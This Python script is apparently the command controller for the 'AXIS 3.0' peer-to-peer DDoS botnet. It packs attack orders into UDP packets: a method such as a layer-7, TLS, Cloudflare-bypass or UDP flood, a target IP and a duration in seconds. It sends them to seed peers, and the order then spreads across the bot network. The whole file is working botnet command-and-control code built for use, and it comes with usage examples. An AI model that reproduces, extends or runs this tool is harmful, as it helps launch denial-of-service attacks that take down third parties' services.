#!/usr/bin/env python3
"""
AXIS 3.0 P2P Network Controller
Send attack commands through P2P network
"""

import socket
import struct
import sys

# P2P seed peers (change these to your seeds)
SEEDS = [
    ("1.2.3.4", 49152),
    ("5.6.7.8", 49152),
    ("9.10.11.12", 49152),
]

# Attack method IDs (must match bot/attack.h)
ATTACKS = {
    "axis-l7": 7,
    "tlsplus": 5,
    "tls": 4,
    "cf": 6,
    "udp": 0,
    "pps": 3,
}

P2P_CMD_ATTACK = 0x10

def build_attack_packet(method, target, duration):
    """Build P2P attack packet"""
    attack_id = ATTACKS.get(method, 7)  # Default to axis-l7
    
    # Packet: CMD(1) + TTL(1) + AttackID(1) + TargetCount(1) + IP(4) + Netmask(1) + Options(1) + Duration(4)
    packet = struct.pack('<BBBB', P2P_CMD_ATTACK, 0, attack_id, 1)
    
    # Target IP
    try:
        ip_bytes = socket.inet_aton(target)
    except:
        ip_bytes = socket.inet_aton('1.1.1.1')
    packet += ip_bytes
    
    # Netmask, options, duration
    packet += struct.pack('<BBI', 32, 0, duration)
    
    return packet

def send_command(packet, seed_host, seed_port):
    """Send UDP packet to seed peer"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(packet, (seed_host, seed_port))
        print(f"✓ Sent to {seed_host}:{seed_port}")
        sock.close()
        return True
    except Exception as e:
        print(f"✗ Failed {seed_host}:{seed_port} - {e}")
        return False

def main():
    if len(sys.argv) < 4:
        print("AXIS 3.0 P2P Controller")
        print("========================")
        print(f"Usage: {sys.argv[0]} <method> <target> <duration>")
        print("")
        print("Methods:")
        for name in ATTACKS:
            print(f"  {name}")
        print("")
        print("Examples:")
        print(f"  {sys.argv[0]} axis-l7 1.2.3.4 300")
        print(f"  {sys.argv[0]} tlsplus 1.2.3.4 600")
        print(f"  {sys.argv[0]} udp 1.2.3.4 120")
        sys.exit(1)
    
    method = sys.argv[1]
    target = sys.argv[2]
    duration = int(sys.argv[3])
    
    print(f"[*] Sending {method} attack on {target} for {duration}s")
    print(f"[*] Via {len(SEEDS)} seed peers")
    
    packet = build_attack_packet(method, target, duration)
    
    success = 0
    for host, port in SEEDS:
        if send_command(packet, host, port):
            success += 1
    
    print(f"[+] Command sent to {success}/{len(SEEDS)} seeds")
    print("[*] Attack will propagate through P2P network")

if __name__ == "__main__":
    main()
